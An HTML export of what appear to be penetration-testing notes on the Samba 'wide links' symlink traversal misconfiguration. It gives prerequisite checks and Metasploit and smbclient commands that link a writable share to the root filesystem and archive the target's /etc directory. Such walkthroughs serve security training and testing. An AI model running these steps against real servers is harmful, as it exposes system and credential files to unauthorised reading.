<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Samba Symlink Directory Traversal (configuration issue)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Samba Symlink Directory Traversal (configuration issue)</h1><br/><strong><h3>Prerequisites:</h3></strong><br />• Samba server contains a writeable share folder<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># smbmap -H [ipAddress]</pre></div><br />    <a href=""><img src="images/1442-1.png" alt="images/1442-1.png" /></a><br />• In <code>/etc/samba/smb.conf</code> we have the parameter <code>wide links = Yes</code>. <br />    We can not check it if we have not full access to the machine<br />    <div class="codebox"><pre>target@host<span style="color:#ff9d00;font-weight:700">:/</span>$ testparm -s <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> <span style="color:#3ad900;font-weight:400">&quot;wide links&quot;</span></pre></div><br /><br /><br />The vulnerability “Samba Symlink Directory Traversal”, is a Samba misconfiguration in its settings that essentially allows an attacker to create a <span style="text-decoration:underline;">symbolic link to the root (/) partition</span> from a writeable share.<br />    This will allow the attacker a read access to the entire file system outside of the share directory.<br /><br />To know more about this issue and <span style="text-decoration:underline;">how to resolve it</span> go to: <a href="https://www.samba.org/samba/news/symlink_attack.html">https://www.samba.org/samba/news/symlink_attack.html</a><br /><br /><strong>Exploit</strong><br />This vulnerability can be exploited using a modified version of the <span style="text-decoration:underline;">smbclient</span>(<a href="https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually">see here how to do it</a>) or in alternative:<br />• <span style="text-decoration:underline;">Metasploit module</span>: <a href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal">https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal</a><br />    <div class="codebox"><pre>msf&gt; use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>admin<span style="color:#ff9d00;font-weight:700">/</span>smb<span style="color:#ff9d00;font-weight:700">/</span>samba_symlink_traversal<br />msf&gt; show options<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST &lt;targetIp&gt;<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBSHARE &lt;writableTargetFolder&gt;              <span style="color:#0088ff;font-weight:400">#check the prerequisites</span><br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> SMBTARGET rootfs                             <span style="color:#0088ff;font-weight:400">#new rootfs folder inside &lt;writableTargetFolder&gt; that is linked to /</span><br />msf&gt; exploit</pre></div><br />    Access to the access the &lt;writableTargetFolder&gt; share. Inside it we should have a “rootfs” directory(SMBTARGET)<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># smbclient <span style="color:#333333;font-weight:400">\\\\</span>192.168.13.29<span style="color:#333333;font-weight:400">\\</span>&lt;writableTargetFolder&gt; -N      <span style="color:#0088ff;font-weight:400">#anonymous access </span><br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">cd</span> rootfs                                                        <span style="color:#0088ff;font-weight:400">#created folder by us</span><br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> get [<span style="color:#ff9d00;font-weight:700">file</span>]                                                       <span style="color:#0088ff;font-weight:400">#to download a file locally</span></pre></div><br />    data exfiltration of all files within a directory<br />    <span style="color:#a5452a;">example:</span> create a tar archive of the /etc/ directory on the target system to our local systems’ /tmp directory.<br />    <div class="codebox"><pre>smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">cd</span> rootfs<span style="color:#333333;font-weight:400">\e</span>tc<br />smb<span style="color:#ff9d00;font-weight:700">:</span> <span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">tar</span> c ..<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>all_files.tar *</pre></div></div>
</body>
</html>
